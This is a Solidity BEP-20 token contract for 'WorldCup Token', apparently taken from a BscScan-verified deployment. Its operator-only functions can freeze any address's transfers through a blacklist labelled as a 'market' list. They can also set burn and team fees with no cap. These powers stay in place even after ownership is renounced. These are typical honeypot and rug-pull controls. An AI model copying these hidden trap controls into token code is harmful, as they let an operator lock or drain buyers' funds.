/**
 *Submitted for verification at BscScan.com on 2022-11-25
*/

/**
 *Submitted for verification at BscScan.com on 2022-05-22
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.6;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract Operator is Context, Ownable {
    address private _operator;

    event OperatorTransferred(
        address indexed previousOperator,
        address indexed newOperator
    );

    constructor() internal {
        _operator = _msgSender();
        emit OperatorTransferred(address(0), _operator);
    }

    modifier onlyOperator() {
        require(
            _operator == msg.sender,
            'operator: caller is not the operator'
        );
        _;
    }

    function isOperator() public view returns (bool) {
        return _msgSender() == _operator;
    }

    function transferOperator(address newOperator_) public onlyOwner {
        _transferOperator(newOperator_);
    }

    function _transferOperator(address newOperator_) internal {
        require(
            newOperator_ != address(0),
            'operator: zero address given for new operator'
        );
        emit OperatorTransferred(address(0), newOperator_);
        _operator = newOperator_;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
        return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
  }
}

contract WorldCupToken is IERC20, Operator {
    using SafeMath for uint256;

    string private _name = "WorldCup Token";
    string private _symbol = "WC";
    uint8 private _decimals = 18;
    uint256 private constant _totalSupply = 10 * 10**8 * 10**18;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping(address => bool) private _marketList;
    address public _teamWalletAddress;
    uint256 public _BurnFee = 1;
    uint256 public _TeamFee = 1;

    constructor (address teamWalletAddress) public {
        _balances[msg.sender] = _totalSupply;
        _teamWalletAddress = teamWalletAddress;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }
    function totalDestroy() public view returns (uint256) {
      return _balances[address(0)];
    }
    function balanceOf(address account) public view  override  returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public  override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view  override  returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public  override  returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public  override  returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function burn(uint256 _value) public returns (bool) {
        require(_value > 0, "Transfer amount must be greater than zero");
        _transfer(msg.sender, address(0), _value);
        return true;
    }
    function _transfer(address _from, address _to, uint256 _amount) internal {
        require(_from != address(0), "transfer from 0");
        require( !_marketList[_from], "ERC20: market is not enabled");
        require( !_marketList[_to], "ERC20: market is not enabled");
        if(_to != address(0)){
          uint256 _burnamount = _amount.mul(_BurnFee).div(100);
          uint256 _teamamount = _amount.mul(_TeamFee).div(100);
          _balances[_from] = _balances[_from].sub(_amount);
          _balances[_to] = _balances[_to].add(_amount).sub(_burnamount).sub(_teamamount);
          _balances[address(0)] = _balances[address(0)].add(_burnamount);
          _balances[_teamWalletAddress] = _balances[_teamWalletAddress].add(_teamamount);
          emit Transfer(_from, _to, _amount.sub(_burnamount).sub(_teamamount));
          emit Transfer(_from, address(0), _burnamount);
          emit Transfer(_from, _teamWalletAddress, _teamamount);
        }else{
         _balances[_from] = _balances[_from].sub(_amount);
         _balances[_to] = _balances[_to].add(_amount);
         emit Transfer(_from, _to, _amount);
        }
        
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function updateMarketList(address market, bool status) external onlyOperator {
        require(_marketList[market] != status, "error: the same status");
        _marketList[market] = status;
    }
    
    function setTeamWalletAddress(address newAddress) external onlyOperator() {
        _teamWalletAddress = newAddress;
    }
    
    function updateBurnFee(uint256 BurnFee) external onlyOperator{
        _BurnFee = BurnFee;
    }
    
    function updateTeamFee(uint256 TeamFee) external onlyOperator{
        _TeamFee = TeamFee;
    }


}